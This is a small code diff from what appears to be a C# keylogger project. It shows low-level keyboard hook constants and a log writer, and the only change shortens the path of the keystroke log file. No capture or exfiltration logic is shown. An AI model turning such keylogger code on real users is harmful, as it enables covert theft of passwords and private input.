@@ -10,7 +10,7 @@ namespace KeyLogger {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
 
-    private const string logFileName = "c:\tilpas\temp\keylog.log";
+    private const string logFileName = "keylog.log";
     private static StreamWriter logFile;
 
     private static HookProc hookProc = HookCallback;
